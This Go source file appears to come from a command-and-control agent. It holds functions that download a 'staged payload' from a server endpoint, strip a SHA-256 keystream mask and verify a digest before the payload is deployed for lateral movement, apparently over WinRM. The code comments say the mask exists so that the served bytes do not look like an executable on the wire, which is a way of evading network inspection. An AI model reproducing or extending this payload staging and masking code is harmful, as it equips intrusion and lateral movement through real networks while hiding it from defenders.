package main

import (
	"crypto/sha256"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

// lateralStageUnmask inverts the listener's staging mask: a SHA-256 counter
// keystream keyed by the staging identifier, so the served bytes never look
// like an executable file on the wire. It mirrors staging_mask on the server
// and stageMask in the stage1 launcher.
func lateralStageUnmask(masked []byte, stagingID string) []byte {
	seed := make([]byte, len(stagingID)+8)
	copy(seed, stagingID)
	data := make([]byte, len(masked))
	for offset := 0; offset < len(masked); offset += sha256.Size {
		binary.BigEndian.PutUint64(seed[len(stagingID):], uint64(offset/sha256.Size))
		block := sha256.Sum256(seed)
		for index := 0; index < sha256.Size && offset+index < len(masked); index++ {
			data[offset+index] = masked[offset+index] ^ block[index]
		}
	}
	return data
}

// lateralStageFetch downloads the masked deployment artifact over this
// agent's existing HTTP channel, unmasks it, and verifies the digest the
// server recorded in the command. The bytes are the server-selected,
// workspace-owned agent build; nothing in this process's own image is
// deployed. A single-use staging reference fetches once per deployment.
func lateralStageFetch(cfg *config, stageID, wantSHA string, timeout time.Duration) ([]byte, error) {
	if cfg == nil || strings.TrimRight(cfg.BaseURL, "/") == "" {
		return nil, errors.New("staging fetch requires the agent base URL")
	}
	if !agentSessionIDPattern.MatchString(stageID) {
		return nil, errors.New("staging reference is missing or invalid")
	}
	if !lateralSHA256Pattern.MatchString(wantSHA) {
		return nil, errors.New("staged payload digest is missing or invalid")
	}
	client := newHTTPClient(cfg)
	if timeout > 0 {
		client.Timeout = timeout
	}
	response, err := client.Get(strings.TrimRight(cfg.BaseURL, "/") + "/tools/stage/" + stageID)
	if err != nil {
		return nil, fmt.Errorf("staged payload download failed: %w", err)
	}
	defer response.Body.Close()
	if response.StatusCode != http.StatusOK {
		detail, _ := io.ReadAll(io.LimitReader(response.Body, 512))
		message := strings.TrimSpace(string(detail))
		if message != "" {
			return nil, fmt.Errorf("staged payload download failed: HTTP %d: %s", response.StatusCode, message)
		}
		return nil, fmt.Errorf("staged payload download failed: HTTP %d", response.StatusCode)
	}
	masked, err := io.ReadAll(io.LimitReader(response.Body, winrmTransferMaxSize+1))
	if err != nil {
		return nil, fmt.Errorf("staged payload download failed: %w", err)
	}
	if len(masked) > winrmTransferMaxSize {
		return nil, fmt.Errorf("staged payload exceeds %d bytes", winrmTransferMaxSize)
	}
	if len(masked) == 0 {
		return nil, errors.New("staged payload is empty")
	}
	payload := lateralStageUnmask(masked, stageID)
	digest := sha256.Sum256(payload)
	if got := fmt.Sprintf("%x", digest); got != wantSHA {
		return nil, errors.New("staged payload digest mismatch")
	}
	return payload, nil
}
